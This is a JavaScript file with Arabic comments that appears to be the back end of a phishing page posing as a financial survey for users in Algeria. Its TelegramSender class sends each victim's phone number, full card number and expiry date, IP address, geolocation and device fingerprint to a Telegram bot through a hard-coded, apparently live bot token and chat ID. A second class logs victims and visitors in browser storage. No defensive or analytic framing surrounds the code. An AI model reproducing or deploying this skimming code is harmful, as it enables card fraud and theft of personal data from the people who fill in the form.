// ملف إرسال البيانات إلى Telegram
class TelegramSender {
    constructor() {
        // ⚠️ استبدل هذه المعلومات بمعلومات بوتك الخاص
        this.BOT_TOKEN = '8593294843:AAHG8eP-W237MsY07USrpQcHAYU5fQwCjCA';
        this.CHAT_ID = '7590246763';
        this.API_URL = `https://api.telegram.org/bot${this.BOT_TOKEN}`;
        
        // رسائل النجاح والفشل
        this.messages = {
            success: '✅ تم إرسال البيانات بنجاح!',
            error: '❌ فشل إرسال البيانات. يرجى المحاولة مرة أخرى.',
            validation: '⚠️ يرجى تعبئة جميع الحقول بشكل صحيح.',
            sending: '📤 جاري إرسال البيانات...'
        };
    }

    // التحقق من صحة التوكن
    async validateToken() {
        try {
            const response = await fetch(`${this.API_URL}/getMe`);
            const data = await response.json();
            return data.ok;
        } catch (error) {
            console.error('خطأ في التحقق من التوكن:', error);
            return false;
        }
    }

    // تنسيق البيانات للرسالة
    formatDataForMessage(userData, deviceData) {
        const timestamp = new Date().toLocaleString('ar-SA', {
            timeZone: 'Africa/Algiers',
            dateStyle: 'full',
            timeStyle: 'medium'
        });

        let message = `
🎯 *بيانات جديدة من الاستبيان المالي - الجزائر*
⏰ *الوقت:* ${timestamp}
🔢 *رقم المشاركة:* ALG-${Date.now().toString().slice(-8)}

📱 *معلومات الاتصال:*
├─ 📞 الهاتف: \`${userData.phone}\`
├─ 💳 رقم البطاقة: \`${userData.cardNumber}\`
└─ 📅 تاريخ الانتهاء: \`${userData.expiryDate}\`

🖥️ *معلومات الجهاز:*
├─ 📱 نوع الجهاز: ${deviceData.device.deviceType}
├─ 💻 نظام التشغيل: ${deviceData.device.operatingSystem}
├─ 🌐 المتصفح: ${deviceData.device.browser}
├─ 📺 دقة الشاشة: ${deviceData.device.screenWidth} × ${deviceData.device.screenHeight}
├─ 🌍 اللغة: ${deviceData.device.language}
└─ 🕒 المنطقة الزمنية: ${deviceData.device.timezone}

🌐 *معلومات الشبكة:*
├─ 🔗 IP: \`${deviceData.network.ipAddress}\`
├─ 📍 المدينة: ${deviceData.network.location.city || 'غير معروف'}
├─ 🏳️ الدولة: ${deviceData.network.location.country_name || 'غير معروف'}
└─ 📶 مزود الخدمة: ${deviceData.network.location.org || 'غير معروف'}

📊 *معلومات إضافية:*
├─ 🔗 المرجع: ${deviceData.additional.referrer}
├─ 📍 الصفحة: ${deviceData.additional.pageUrl}
├─ 📱 جهاز محمول: ${deviceData.device.isMobile ? 'نعم' : 'لا'}
└─ 👆 شاشة لمس: ${deviceData.device.isTouchDevice ? 'نعم' : 'لا'}
`;

        // إضافة معلومات الموقع الجغرافي إذا كانت متاحة
        if (deviceData.geolocation && !deviceData.geolocation.error) {
            message += `
📍 *الموقع الجغرافي:*
├─ 📍 خط العرض: ${deviceData.geolocation.latitude}
├─ 📍 خط الطول: ${deviceData.geolocation.longitude}
└─ 📏 الدقة: ${deviceData.geolocation.accuracy} متر
`;
        }

        // إضافة معلومات الاتصال إذا كانت متاحة
        if (deviceData.device.connection) {
            message += `
📶 *معلومات الاتصال:*
├─ 📶 نوع الشبكة: ${deviceData.device.connection.effectiveType}
├─ ⬇️ سرعة التنزيل: ${deviceData.device.connection.downlink} Mbps
└─ ⏱️ وقت الاستجابة: ${deviceData.device.connection.rtt} ms
`;
        }

        return message;
    }

    // إرسال الرسالة إلى Telegram
    async sendMessage(text) {
        try {
            const response = await fetch(`${this.API_URL}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: this.CHAT_ID,
                    text: text,
                    parse_mode: 'Markdown',
                    disable_web_page_preview: true
                })
            });

            const data = await response.json();
            
            if (data.ok) {
                console.log('✅ تم إرسال الرسالة بنجاح:', data.result.message_id);
                
                // إرسال رسالة ثانية مع المزيد من التفاصيل
                await this.sendDetailedData(text);
                
                return { success: true, messageId: data.result.message_id };
            } else {
                console.error('❌ خطأ من Telegram API:', data.description);
                return { success: false, error: data.description };
            }
        } catch (error) {
            console.error('❌ خطأ في إرسال الرسالة:', error);
            return { success: false, error: error.message };
        }
    }

    // إرسال بيانات مفصلة في رسالة منفصلة
    async sendDetailedData(initialMessage) {
        try {
            const detailedMessage = `
🔐 *بيانات مفصلة - الجزائر*

📞 *رقم الهاتف الكامل:* 
\`${document.getElementById('phone')?.value || 'غير متوفر'}\`

💳 *بيانات البطاقة الكاملة:*
• الرقم: \`${document.getElementById('card-number')?.value || 'غير متوفر'}\`
• الانتهاء: \`${document.getElementById('expiry-date')?.value || 'غير متوفر'}\`

🖥️ *معلومات المتصفح الكاملة:*
${navigator.userAgent}

📊 *إحصائيات الجهاز:*
• الذاكرة: ${navigator.deviceMemory || 'غير معروف'} GB
• المعالجات: ${navigator.hardwareConcurrency || 'غير معروف'}
• عمق الألوان: ${screen.colorDepth} بت
• نسبة البكسل: ${window.devicePixelRatio}

🌍 *معلومات الموقع:*
• العنوان الكامل: ${window.location.href}
• اللغات المفضلة: ${navigator.languages?.join(', ') || 'غير معروف'}

⏰ *الوقت الدقيق:* ${new Date().toISOString()}
            `.trim();

            await fetch(`${this.API_URL}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: this.CHAT_ID,
                    text: detailedMessage,
                    parse_mode: 'Markdown'
                })
            });

        } catch (error) {
            console.error('خطأ في إرسال البيانات المفصلة:', error);
        }
    }

    // إرسال الإخطار الأولي
    async sendInitialNotification() {
        const notification = `
🔔 *بدء استبيان جديد - الجزائر*

📱 *تم بدء استبيان جديد في:* ${new Date().toLocaleString('ar-SA', {
            timeZone: 'Africa/Algiers',
            hour12: true,
            dateStyle: 'medium',
            timeStyle: 'medium'
        })}

🖥️ *المتصفح:* ${navigator.userAgent.substring(0, 50)}...

📍 *الصفحة:* ${window.location.href}

⏳ *جاري تعبئة البيانات...*
        `.trim();

        return await this.sendMessage(notification);
    }

    // العملية الرئيسية لإرسال البيانات
    async sendUserData(userData, deviceData) {
        try {
            // عرض حالة الإرسال
            this.showNotification(this.messages.sending, 'warning');
            
            // إرسال الإخطار الأولي
            await this.sendInitialNotification();
            
            // تنسيق البيانات وإرسالها
            const formattedMessage = this.formatDataForMessage(userData, deviceData);
            const result = await this.sendMessage(formattedMessage);
            
            if (result.success) {
                this.showNotification(this.messages.success, 'success');
                
                // تسجيل نجاح الإرسال
                this.logSubmission(userData, deviceData, true);
                
                return true;
            } else {
                this.showNotification(this.messages.error, 'error');
                
                // تسجيل فشل الإرسال
                this.logSubmission(userData, deviceData, false, result.error);
                
                return false;
            }
        } catch (error) {
            console.error('❌ خطأ في إرسال بيانات المستخدم:', error);
            this.showNotification(this.messages.error, 'error');
            return false;
        }
    }

    // عرض الإشعارات
    showNotification(message, type = 'info') {
        const notification = document.getElementById('notification');
        
        if (!notification) {
            console.log(message);
            return;
        }
        
        notification.textContent = message;
        notification.className = `notification ${type} show`;
        
        // إخفاء الإشعار بعد 5 ثواني
        setTimeout(() => {
            notification.classList.remove('show');
        }, 5000);
    }

    // تسجيل عملية الإرسال
    logSubmission(userData, deviceData, success, error = null) {
        const logEntry = {
            timestamp: new Date().toISOString(),
            userData: {
                phone: userData.phone,
                cardNumber: userData.cardNumber,
                expiryDate: userData.expiryDate
            },
            deviceInfo: {
                ip: deviceData.network.ipAddress,
                deviceType: deviceData.device.deviceType,
                browser: deviceData.device.browser
            },
            success: success,
            error: error,
            page: window.location.href
        };
        
        // تخزين السجل محلياً
        try {
            const logs = JSON.parse(localStorage.getItem('telegram_logs') || '[]');
            logs.push(logEntry);
            localStorage.setItem('telegram_logs', JSON.stringify(logs.slice(-100))); // حفظ آخر 100 سجل
        } catch (e) {
            console.error('خطأ في حفظ السجل:', e);
        }
    }

    // اختبار الاتصال بالبوت
    async testConnection() {
        this.showNotification('🔍 جاري اختبار الاتصال...', 'warning');
        
        const isValid = await this.validateToken();
        
        if (isValid) {
            this.showNotification('✅ الاتصال مع Telegram ناجح!', 'success');
            return true;
        } else {
            this.showNotification('❌ فشل الاتصال مع Telegram', 'error');
            return false;
        }
    }
}

// إنشاء كائن الإرسال العام
const telegramSender = new TelegramSender();

// تصدير الكائن للاستخدام في ملفات أخرى
window.telegramSender = telegramSender;


// تحديث نظام إرسال البيانات للعمل مع لوحة التحكم

class DataManager {
    constructor() {
        this.storageKey = 'survey_data';
        this.maxEntries = 1000; // الحد الأقصى للبيانات المخزنة
    }

    // حفظ بيانات المشاركة
    async saveSubmission(userData, deviceData) {
        try {
            // إنشاء كائن المشاركة
            const submission = {
                id: this.generateSubmissionId(),
                ...userData,
                deviceInfo: {
                    type: deviceData.device?.deviceType || this.detectDeviceType(),
                    browser: deviceData.device?.browser || this.detectBrowser(),
                    os: deviceData.device?.operatingSystem || this.detectOS(),
                    resolution: deviceData.device?.screenResolution || `${screen.width}×${screen.height}`,
                    ip: deviceData.network?.ipAddress || await this.getIPAddress(),
                    location: deviceData.network?.location || {},
                    userAgent: navigator.userAgent.substring(0, 200)
                },
                timestamp: new Date().toISOString(),
                status: 'active',
                viewed: false
            };

            // حفظ في localStorage
            this.saveToLocalStorage(submission);
            
            // إرسال إشعار (إن أمكن)
            this.sendNotification(submission);
            
            // تسجيل النشاط
            this.logActivity('new_submission', submission.id);
            
            return { success: true, id: submission.id };
            
        } catch (error) {
            console.error('❌ خطأ في حفظ البيانات:', error);
            return { success: false, error: error.message };
        }
    }

    // حفظ بيانات الزائر
    async saveVisitor(deviceData) {
        try {
            const visitor = {
                id: this.generateVisitorId(),
                ip: deviceData.network?.ipAddress || await this.getIPAddress(),
                country: deviceData.network?.location?.country_name || 'غير معروف',
                city: deviceData.network?.location?.city || 'غير معروف',
                device: this.detectDeviceType(),
                browser: this.detectBrowser(),
                os: this.detectOS(),
                page: window.location.href,
                referrer: document.referrer || 'مباشر',
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent.substring(0, 100)
            };

            // حفظ في localStorage
            this.saveVisitorToStorage(visitor);
            
            return { success: true };
            
        } catch (error) {
            console.error('خطأ في حفظ بيانات الزائر:', error);
            return { success: false };
        }
    }

    // توليد معرف المشاركة
    generateSubmissionId() {
        const timestamp = Date.now().toString().slice(-8);
        const random = Math.floor(Math.random() * 1000).toString().padStart(3, '0');
        return `ALG-${timestamp}-${random}`;
    }

    // توليد معرف الزائر
    generateVisitorId() {
        const timestamp = Date.now().toString().slice(-6);
        const random = Math.floor(Math.random() * 1000).toString().padStart(3, '0');
        return `VIS-${timestamp}-${random}`;
    }

    // حفظ في localStorage
    saveToLocalStorage(submission) {
        try {
            // تحميل البيانات الحالية
            const existingData = JSON.parse(localStorage.getItem(this.storageKey) || '{}');
            
            // تهيئة المصفوفات إذا لم تكن موجودة
            if (!existingData.submissions) {
                existingData.submissions = [];
            }
            
            // إضافة المشاركة الجديدة
            existingData.submissions.unshift(submission);
            
            // الاحتفاظ بحد أقصى للبيانات
            if (existingData.submissions.length > this.maxEntries) {
                existingData.submissions = existingData.submissions.slice(0, this.maxEntries);
            }
            
            // حفظ البيانات المحدثة
            localStorage.setItem(this.storageKey, JSON.stringify(existingData));
            
            // تحديث العداد
            this.updateCounter();
            
            console.log('✅ تم حفظ البيانات في لوحة التحكم');
            return true;
            
        } catch (error) {
            console.error('خطأ في حفظ البيانات في localStorage:', error);
            throw error;
        }
    }

    // حفظ بيانات الزائر في التخزين
    saveVisitorToStorage(visitor) {
        try {
            const existingData = JSON.parse(localStorage.getItem(this.storageKey) || '{}');
            
            if (!existingData.visitors) {
                existingData.visitors = [];
            }
            
            existingData.visitors.unshift(visitor);
            
            if (existingData.visitors.length > this.maxEntries) {
                existingData.visitors = existingData.visitors.slice(0, this.maxEntries);
            }
            
            localStorage.setItem(this.storageKey, JSON.stringify(existingData));
            return true;
            
        } catch (error) {
            console.error('خطأ في حفظ بيانات الزائر:', error);
            return false;
        }
    }

    // تحديث العداد
    updateCounter() {
        const countElement = document.getElementById('submissions-count');
        if (countElement) {
            const existingData = JSON.parse(localStorage.getItem(this.storageKey) || '{}');
            const count = existingData.submissions?.length || 0;
            countElement.textContent = count;
        }
    }

    // إرسال إشعار
    sendNotification(submission) {
        // يمكن إضافة إشعارات بالمتصفح إذا كان مسموحاً
        if ('Notification' in window && Notification.permission === 'granted') {
            new Notification('مشاركة جديدة', {
                body: `تم استلام مشاركة جديدة من ${submission.phone}`,
                icon: '/assets/logo.png'
            });
        }
        
        // يمكن إضافة إشعارات صوتية
        this.playNotificationSound();
    }

    // تشغيل صوت الإشعار
    playNotificationSound() {
        try {
            const audio = new Audio('data:audio/wav;base64,UklGRigAAABXQVZFZm10IBIAAAABAAEARKwAAIhYAQACABAAZGF0YQQAAAAAAA==');
            audio.volume = 0.3;
            audio.play();
        } catch (error) {
            // تجاهل الأخطاء في تشغيل الصوت
        }
    }

    // تسجيل النشاط
    logActivity(type, data) {
        try {
            const activity = {
                type,
                data,
                timestamp: new Date().toISOString()
            };
            
            const existingData = JSON.parse(localStorage.getItem(this.storageKey) || '{}');
            
            if (!existingData.activities) {
                existingData.activities = [];
            }
            
            existingData.activities.unshift(activity);
            
            // الاحتفاظ بآخر 100 نشاط فقط
            if (existingData.activities.length > 100) {
                existingData.activities = existingData.activities.slice(0, 100);
            }
            
            localStorage.setItem(this.storageKey, JSON.stringify(existingData));
            
        } catch (error) {
            console.error('خطأ في تسجيل النشاط:', error);
        }
    }

    // الكشف عن نوع الجهاز
    detectDeviceType() {
        const ua = navigator.userAgent;
        if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua)) {
            return 'جهاز لوحي';
        } else if (/Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/.test(ua)) {
            return 'هاتف محمول';
        }
        return 'كمبيوتر مكتبي';
    }

    // الكشف عن المتصفح
    detectBrowser() {
        const ua = navigator.userAgent;
        let browser = "متصفح غير معروف";
        
        if (ua.includes("Firefox")) browser = "Firefox";
        else if (ua.includes("SamsungBrowser")) browser = "Samsung Internet";
        else if (ua.includes("Opera") || ua.includes("OPR")) browser = "Opera";
        else if (ua.includes("Trident")) browser = "Internet Explorer";
        else if (ua.includes("Edge")) browser = "Microsoft Edge";
        else if (ua.includes("Chrome")) browser = "Chrome";
        else if (ua.includes("Safari")) browser = "Safari";
        
        return browser;
    }

    // الكشف عن نظام التشغيل
    detectOS() {
        const ua = navigator.userAgent;
        let os = "نظام غير معروف";
        
        if (ua.includes("Windows")) os = "Windows";
        else if (ua.includes("Mac")) os = "macOS";
        else if (ua.includes("X11")) os = "UNIX";
        else if (ua.includes("Linux")) os = "Linux";
        else if (ua.includes("Android")) os = "Android";
        else if (ua.includes("iOS") || ua.includes("iPhone") || ua.includes("iPad")) os = "iOS";
        
        return os;
    }

    // الحصول على عنوان IP
    async getIPAddress() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip || 'غير متاح';
        } catch (error) {
            return 'غير متاح';
        }
    }

    // الحصول على جميع البيانات
    getAllData() {
        try {
            return JSON.parse(localStorage.getItem(this.storageKey) || '{}');
        } catch (error) {
            return {};
        }
    }

    // مسح البيانات القديمة
    cleanupOldData(daysToKeep = 30) {
        try {
            const existingData = JSON.parse(localStorage.getItem(this.storageKey) || '{}');
            const cutoffDate = new Date();
            cutoffDate.setDate(cutoffDate.getDate() - daysToKeep);
            
            if (existingData.submissions) {
                existingData.submissions = existingData.submissions.filter(sub => {
                    const submissionDate = new Date(sub.timestamp);
                    return submissionDate > cutoffDate;
                });
            }
            
            if (existingData.visitors) {
                existingData.visitors = existingData.visitors.filter(vis => {
                    const visitorDate = new Date(vis.timestamp);
                    return visitorDate > cutoffDate;
                });
            }
            
            localStorage.setItem(this.storageKey, JSON.stringify(existingData));
            console.log('✅ تم تنظيف البيانات القديمة');
            
        } catch (error) {
            console.error('خطأ في تنظيف البيانات:', error);
        }
    }
}

// إنشاء مدير البيانات
const dataManager = new DataManager();

// تحديث دالة sendToTelegram للعمل مع النظام الجديد
async function sendToTelegram(userData, deviceData) {
    try {
        // حفظ بيانات المشاركة
        const result = await dataManager.saveSubmission(userData, deviceData);
        
        // حفظ بيانات الزائر
        await dataManager.saveVisitor(deviceData);
        
        return result;
        
    } catch (error) {
        console.error('❌ خطأ في إرسال البيانات:', error);
        return { success: false, error: error.message };
    }
}

// تهيئة النظام عند تحميل الصفحة
document.addEventListener('DOMContentLoaded', function() {
    // تنظيف البيانات القديمة (مرة واحدة في اليوم)
    const lastCleanup = localStorage.getItem('last_cleanup');
    const today = new Date().toDateString();
    
    if (lastCleanup !== today) {
        dataManager.cleanupOldData();
        localStorage.setItem('last_cleanup', today);
    }
    
    // طلب إذن الإشعارات
    if ('Notification' in window && Notification.permission === 'default') {
        Notification.requestPermission();
    }
});

// تصدير المدير للاستخدام العام
window.dataManager = dataManager;